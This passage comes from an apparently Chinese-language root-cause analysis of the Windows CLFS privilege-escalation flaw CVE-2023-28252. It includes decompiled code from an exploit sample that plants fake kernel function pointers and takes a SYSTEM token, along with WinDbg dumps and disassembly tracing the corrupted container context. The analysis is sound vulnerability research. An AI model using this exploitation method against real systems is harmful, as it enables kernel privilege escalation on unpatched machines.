ntdll!RtlUserThreadStart+0x21</span></span></code></pre></div><p>样本中对应的伪代码如下，在调用CreateLogFile时触发了漏洞，调用ClfsEarlierLsn函数。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>MEMORY[<span style="color:#ae81ff">0x50011E0</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x50011E8</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x50011F0</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x50011F8</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001000</span>]<span style="color:#f92672">=</span> ClfsMgmtDeregisterManagedClientAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001028</span>]<span style="color:#f92672">=</span> RtlClearBitKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000008</span>]<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">+</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">56</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CreateLogFile</span>(<span style="color:#f92672">::</span>pszLogFileName,<span style="color:#ae81ff">0xC0010000</span>,<span style="color:#ae81ff">3u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span> v65<span style="color:#f92672">=</span> system_TOKEN;</span></span><span style="display:flex;"><span> system_token_object<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v66<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">size_t</span><span style="color:#f92672">*</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>))(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span> v67<span style="color:#f92672">=</span><span style="color:#a6e22e">sub_7FF662E78B70</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v66</span>(v67,<span style="color:#f92672">&amp;</span>system_token_object, v65,<span style="color:#ae81ff">8</span>i64, v88);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( system_token_object<span style="color:#f92672">>=</span><span style="color:#ae81ff">0x8181818181818181u</span>i64 )</span></span></code></pre></div><p>根据调用栈，再除去布局的函数之外，最后调用的是CLFS!CClfsBaseFilePersisted::CheckSecureAccess+0x174</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>fffff800`531337d4 488bf9 mov rdi, rcx</span></span><span style="display:flex;"><span>fffff800`531337d7 48894c2450 mov qword ptr [rsp+50h], rcx</span></span><span style="display:flex;"><span>fffff800`531337dc 488b01 mov rax, qword ptr [rcx]</span></span><span style="display:flex;"><span>fffff800`531337df 488b00 mov rax, qword ptr [rax]</span></span><span style="display:flex;"><span>**fffff800`531337e2 ff15001effff call qword ptr [CLFS!__guard_dispatch_icall_fptr (fffff800531255e8)]**</span></span><span style="display:flex;"><span>fffff800`531337e8 4c8d4c2448 lea r9, [rsp+48h]</span></span></code></pre></div><p><img src="../../../images/vulnerability/Windows-CLFS-EoP/4.png" alt="" path="vulnerability/Windows-CLFS-EoP/" if="vulnerability/Windows-CLFS-EoP/CVE-2023-28252.zh-cn.md"/></p><p>同时调试器中可以看到rcx指向的对象位于0x5000000，同时对象内的函数指针指向了ClfsEarlierLsn，和调试过程中的一致。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> rrcx</span></span><span style="display:flex;"><span>rcx=0000000005000000</span></span><span style="display:flex;"><span>0: kd> dq rcx</span></span><span style="display:flex;"><span>00000000`05000000 00000000`05001000 ffffa289`14aec2b2</span></span><span style="display:flex;"><span>00000000`05000010 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000020 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000030 ffffa289`17764520 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000040 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000050 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000060 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000070 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>0: kd> dq 00000000`05001000</span></span><span style="display:flex;"><span>00000000`05001000 fffff800`53141b60 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001010 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001020 fffff800`53112b20 fffff800`55c2c640</span></span><span style="display:flex;"><span>00000000`05001030 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001040 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001050 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001060 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001070 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>0: kd> u fffff800`53112b20</span></span><span style="display:flex;"><span>CLFS!ClfsEarlierLsn:</span></span><span style="display:flex;"><span>fffff800`53112b20 488b0511280000 mov rax,qword ptr [CLFS!CLFS_LSN_INVALID (fffff800`53115338)]</span></span><span style="display:flex;"><span>fffff800`53112b27 4885c9 test rcx,rcx</span></span><span style="display:flex;"><span>fffff800`53112b2a 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62)</span></span><span style="display:flex;"><span>fffff800`53112b2c 488b09 mov rcx,qword ptr [rcx]</span></span><span style="display:flex;"><span>fffff800`53112b2f 483b0d8a230000 cmp rcx,qword ptr [CLFS!CLFS_LSN_NULL (fffff800`53114ec0)]</span></span><span style="display:flex;"><span>fffff800`53112b36 742a je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62)</span></span><span style="display:flex;"><span>fffff800`53112b38 483bc8 cmp rcx,rax</span></span><span style="display:flex;"><span>fffff800`53112b3b 7425 je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62)</span></span></code></pre></div><p>根据CClfsBaseFilePersisted::CheckSecureAccess的伪代码，可知触发漏洞的错误对象来自于CClfsBaseFile::GetSymbol，并且其类型为_CLFS_CONTAINER_CONTEXT 对象指针。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Symbol<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetSymbol</span>(a1, v14, v12,<span style="color:#f92672">&amp;</span>v25);<span style="color:#75715e">// 获取到错误对象</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v17<span style="color:#f92672">=</span> Symbol;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( Symbol<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_21;</span></span><span style="display:flex;"><span> v15<span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">***</span>)(_QWORD))<span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)v25<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v15 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v20<span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> CClfsContainer<span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)v25<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>);<span style="color:#75715e">// 调用函数指针</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v7<span style="color:#f92672">=</span> v20;</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetSymbol</span>(</span></span><span style="display:flex;"><span> PERESOURCE<span style="color:#f92672">*</span>this,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> a3,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _CLFS_CONTAINER_CONTEXT<span style="color:#f92672">**</span>a4)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v17<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( a2<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x1368</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3222929421</span>i64;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a4<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ExAcquireResourceSharedLite</span>(this[<span style="color:#ae81ff">4</span>],<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">IsValidOffset</span>((CClfsBaseFile<span style="color:#f92672">*</span>)this, v6<span style="color:#f92672">+</span><span style="color:#ae81ff">47</span>) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetBaseLogRecord</span>((CClfsBaseFile<span style="color:#f92672">*</span>)this);</span></span><span style="display:flex;"><span> v18[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ULongAdd</span>(v6,<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v11<span style="color:#f92672">+</span><span style="color:#ae81ff">40</span>), (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)v18)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#f92672">!</span>v12</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> v18[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">>=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)(v13<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">9</span>)</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#f92672">!</span>(v12<span style="color:#f92672">+</span> v6) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v12<span style="color:#f92672">+</span> v6<span style="color:#f92672">-</span><span style="color:#ae81ff">12</span>)<span style="color:#f92672">!=</span> (_DWORD)v6 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1073741816</span>;</span></span><span style="display:flex;"><span>LABEL_16:</span></span><span style="display:flex;"><span> v17<span style="color:#f92672">=</span> v8;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_17;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v14<span style="color:#f92672">=</span><span style="color:#a6e22e">ClfsQuadAlign</span>(<span style="color:#ae81ff">0x30u</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v15<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">!=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)(v16<span style="color:#f92672">+</span> v14)</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)v15<span style="color:#f92672">!=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1040322552</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v15<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">48</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v15<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">!=</span> a3 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>LABEL_15:</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_16;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a4<span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> _CLFS_CONTAINER_CONTEXT<span style="color:#f92672">*</span>)v15;</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v8;</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C00346FE<span style="color:#ae81ff">8</span>B FA mov edi, edx</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034766 E8 B5<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> call<span style="color:#f92672">?</span>GetBaseLogRecord<span style="color:#960050;background-color:#1e0010">@</span>CClfsBaseFile<span style="color:#960050;background-color:#1e0010">@@</span>IEAAPEAU_CLFS_BASE_RECORD_HEADER<span style="color:#960050;background-color:#1e0010">@@</span>XZ ; CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetBaseLogRecord</span>(<span style="color:#66d9ef">void</span>)</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034766</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C003476B ;<span style="color:#ae81ff">28</span><span style="color:#f92672">:</span> v18[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C003476B<span style="color:#ae81ff">4</span>C<span style="color:#ae81ff">8</span>B C8 mov r9, rax</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C003476E<span style="color:#ae81ff">89</span><span style="color:#ae81ff">5</span>C<span style="color:#ae81ff">24</span><span style="color:#ae81ff">24</span> mov [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>h<span style="color:#f92672">+</span>var_24], ebx</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034772 ;<span style="color:#ae81ff">29</span><span style="color:#f92672">:</span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ULongAdd</span>(v6,<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v11<span style="color:#f92672">+</span><span style="color:#ae81ff">40</span>), (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)v18)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034772 ;<span style="color:#ae81ff">30</span><span style="color:#f92672">:</span><span style="color:#f92672">||</span><span style="color:#f92672">!</span>v12</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034772 ;<span style="color:#ae81ff">31</span><span style="color:#f92672">:</span><span style="color:#f92672">||</span> v18[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">>=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)(v13<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">9</span>)</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034772 ;<span style="color:#ae81ff">32</span><span style="color:#f92672">:</span><span style="color:#f92672">||</span><span style="color:#f92672">!</span>(v12<span style="color:#f92672">+</span> v6) )</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034772<span style="color:#ae81ff">4</span>C<span style="color:#ae81ff">8</span>D<span style="color:#ae81ff">44</span><span style="color:#ae81ff">24</span><span style="color:#ae81ff">24</span> lea r8, [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>h<span style="color:#f92672">+</span>var_24]</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034777<span style="color:#ae81ff">41</span><span style="color:#ae81ff">8</span>B<span style="color:#ae81ff">53</span><span style="color:#ae81ff">28</span> mov edx, [r11<span style="color:#f92672">+</span><span style="color:#ae81ff">28</span>h]</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C003477B<span style="color:#ae81ff">8</span>B CF mov ecx, edi</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C003477D E8<span style="color:#ae81ff">1</span>E<span style="color:#ae81ff">7</span>D FD FF call<span style="color:#f92672">?</span>ULongAdd<span style="color:#960050;background-color:#1e0010">@@</span>YAJKKPEAK<span style="color:#960050;background-color:#1e0010">@</span>Z ;<span style="color:#a6e22e">ULongAdd</span>(ulong,ulong,ulong<span style="color:#f92672">*</span>)</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C003477D</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034782<span style="color:#ae81ff">85</span> C0 test eax, eax</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034784<span style="color:#ae81ff">78</span><span style="color:#ae81ff">5</span>B js<span style="color:#66d9ef">short</span> loc_1C00347E1</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034784</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034786<span style="color:#ae81ff">4</span>D<span style="color:#ae81ff">85</span> C9 test r9, r9</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034789<span style="color:#ae81ff">74</span><span style="color:#ae81ff">56</span> jz<span style="color:#66d9ef">short</span> loc_1C00347E1</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034789</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C003478B<span style="color:#ae81ff">41</span><span style="color:#ae81ff">0F</span> B7<span style="color:#ae81ff">43</span><span style="color:#ae81ff">04</span> movzx eax, word ptr [r11<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>]</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034790 C1 E0<span style="color:#ae81ff">09</span> shl eax,<span style="color:#ae81ff">9</span></span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034793<span style="color:#ae81ff">39</span><span style="color:#ae81ff">44</span><span style="color:#ae81ff">24</span><span style="color:#ae81ff">24</span> cmp [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>h<span style="color:#f92672">+</span>var_24], eax</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034797<span style="color:#ae81ff">73</span><span style="color:#ae81ff">48</span> jnb<span style="color:#66d9ef">short</span> loc_1C00347E1</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034797</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034799 ;<span style="color:#ae81ff">34</span><span style="color:#f92672">:</span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034799<span style="color:#ae81ff">48</span><span style="color:#ae81ff">8</span>B D7 mov rdx, rdi</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C003479C<span style="color:#ae81ff">49</span><span style="color:#ae81ff">03</span> D1 add rdx, r9</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C00347DC<span style="color:#ae81ff">49</span><span style="color:#ae81ff">89</span><span style="color:#ae81ff">16</span> mov [r14], rdx</span></span></code></pre></div><p>根据伪代码和汇编可知最终a4的值由rdx+r9，r9来自于GetBaseLogRecord函数返回值，是一个固定值，rdx是CClfsBaseFile::GetSymbol的第二个参数，需要注意的是要将值赋给a4需要满足if语句中的条件，可以看到对应于在主blf文件修改的几个值。</p><p>在CClfsBaseFilePersisted::CheckSecureAccess中，GetSymbol的第二个参数为BaseLogRecord+0x328，对应于rgContainers数组。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BaseLogRecord<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetBaseLogRecord</span>((CClfsBaseFile<span style="color:#f92672">*</span>)a1);</span></span><span style="display:flex;"><span> v26<span style="color:#f92672">=</span> BaseLogRecord;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>BaseLogRecord )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>LABEL_20:</span></span><span style="display:flex;"><span> Symbol<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span> v17<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_21;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v24<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v23<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v13<span style="color:#f92672">&lt;</span> v11<span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v12<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x400</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v14<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)BaseLogRecord<span style="color:#f92672">+</span> v12<span style="color:#f92672">+</span><span style="color:#ae81ff">0xCA</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v14 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> Symbol<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetSymbol</span>(a1, v14, v12,<span style="color:#f92672">&amp;</span>v25);<span style="color:#75715e">// 获取到错误对象</span></span></span></code></pre></div><p>在内存中可以看到其值为0x1570</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db ffffe381<span style="color:#960050;background-color:#1e0010">`</span>a86d7070<span style="color:#f92672">+</span><span style="color:#ae81ff">0x328</span></span></span><span style="display:flex;"><span>ffffe381<span style="color:#960050;background-color:#1e0010">`</span>a86d7398<span style="color:#ae81ff">70</span><span style="color:#ae81ff">15</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> p...............</span></span><span style="display:flex;"><span>ffffe381<span style="color:#960050;background-color:#1e0010">`</span>a86d73a8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span></code></pre></div><p>根据代码逻辑GetSymbol会根据BaseLogRecord+0x1570定位container context对象并尝试调用pContainer成员的指针，container context如下：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> dq ffffe381`a86d7070 + 0x1570</span></span><span style="display:flex;"><span>ffffe381`a86d85e0 00000030`c1fdf008 00000000`00000000</span></span><span style="display:flex;"><span>ffffe381`a86d85f0 00000000`00000000 00000000`05000000</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>0: kd> dps 00000000`05000000</span></span><span style="display:flex;"><span>00000000`05000000 00000000`05001000</span></span><span style="display:flex;"><span>00000000`05000008 ffffa289`14aec2b2</span></span><span style="display:flex;"><span>00000000`05000010 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000018 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000020 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000028 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000030 ffffa289`17764520</span></span><span style="display:flex;"><span>00000000`05000038 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000040 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000048 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000050 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000058 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000060 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000068 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000070 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000078 00000000`00000000</span></span><span style="display:flex;"><span>0: kd> dq 00000000`05001000</span></span><span style="display:flex;"><span>00000000`05001000 fffff800`53141b60 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001010 